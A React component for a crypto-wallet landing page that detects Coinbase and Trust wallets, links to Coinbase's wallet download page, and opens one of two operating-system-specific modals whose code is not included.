import React, { useEffect, useState } from "react";
import "../styles/app.css";
import "../styles/modal.css";

import WalletModal1 from "./WalletModal1";
import WalletModal2 from "./WalletModal2";
import {
  detectCoinbaseWallet,
  detectTrustWallet,
} from "./walletDetection.js";

const VIDEO_URL =
  "https://d1i6zd1p5d75mw.cloudfront.net/images/s/headervideo/1/3306010965.mp4";

export default function ButtonPage() {
  const [wallets, setWallets] = useState([false, false]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [hasCoinbaseWallet, setHasCoinbaseWallet] = useState(false);

  const scan = async () => {
    setLoading(true);
    setError("");
    setWallets([false, false]);

    try {
      const results = await Promise.allSettled([
        detectCoinbaseWallet(100),
        detectTrustWallet(100),
      ]);

      const nextWallets = [
        results[0].status === "fulfilled" && Boolean(results[0].value),
        results[1].status === "fulfilled" && Boolean(results[1].value),
      ];

      setWallets(nextWallets);
    } catch (scanError) {
      setError(scanError?.message || "Wallet scan failed.");
    } finally {
      setLoading(false);
    }
  };

  const getOS = () => {
    if (typeof window === "undefined") {
      return "unknown";
    }
    const userAgent = navigator.userAgent.toLowerCase();
    const platform = navigator.platform.toLowerCase();

    if (platform.includes("mac") || userAgent.includes("mac")) {
      return "mac";
    }

    if (platform.includes("win") || userAgent.includes("windows")) {
      return "windows";
    }

    if (platform.includes("linux") || userAgent.includes("linux")) {
      return "linux";
    }

    return "unknown";
  };

  const os = getOS();

  const getCoinbaseProvider = () => {
    if (typeof window === "undefined") {
      return null;
    }

    const ethereum = window.ethereum;
    if (!ethereum) {
      return null;
    }

    if (ethereum.isCoinbaseWallet) {
      return ethereum;
    }

    if (Array.isArray(ethereum.providers)) {
      return ethereum.providers.find((provider) => provider.isCoinbaseWallet) || null;
    }

    return null;
  };

  useEffect(() => {
    scan();
  }, []);

  const handleConnectWallet = (event) => {
    event?.preventDefault();
    event?.stopPropagation();

    setHasCoinbaseWallet(wallets[0]);

    if (!wallets[0]) {
      const walletUrl = "https://www.coinbase.com/wallet/downloads";
      window.location.href = walletUrl;
      return;
    }

    const done = window.localStorage.getItem("wallet_done");

    if (done !== "true") {
      setShowModal(true);
    }
  };

  if (loading) {
    return (
      <div className="button-page">
        <video
          className="button-page-video"
          src={VIDEO_URL}
          autoPlay
          muted
          loop
          playsInline
          aria-hidden="true"
        />
        
      </div>
    );
  }

  return (
    <div className="button-page">
      <video
        className="button-page-video"
        src={VIDEO_URL}
        autoPlay
        muted
        loop
        playsInline
        aria-hidden="true"
      />
      <section className="welcome-card" aria-labelledby="welcome-title">
        <button
          type="button"
          className="connect-wallet-button"
          onClick={handleConnectWallet}
        >
          {wallets[0] ? "Connect Wallet" : "Install Wallet"}
        </button>
      </section>

      {showModal &&
        (os === "mac" ? (
          <WalletModal1 onClose={() => setShowModal(false)} />
        ) : (
          <WalletModal2 onClose={() => setShowModal(false)} />
        ))}
    </div>
  );
}
